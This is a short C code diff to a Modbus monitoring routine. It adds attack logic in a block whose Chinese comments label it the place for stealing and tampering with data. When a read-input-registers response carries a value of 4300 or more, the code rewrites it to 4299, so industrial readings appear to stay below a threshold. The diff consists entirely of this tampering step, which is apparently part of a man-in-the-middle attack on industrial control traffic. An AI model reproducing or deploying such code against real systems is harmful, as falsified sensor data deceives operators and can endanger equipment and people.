@@ -220,8 +220,10 @@ int modbus_monitor_start(void * sub_proc,void * para)
                             printf(" get modbus data %d bytes from server!\n",len);
                             print_bin_data(Buf,len,16);
 			// 窃取数据和篡改数据的位置开始
-			
-			 
+			if(Buf[7] == 0x04 && ((Buf[10] << 8) + Buf[9] >= 4300)) {
+			  	Buf[10] = 0x10;
+                Buf[9] = 0xCB;
+            }
 
 			//窃取数据和篡改数据的位置结束
 
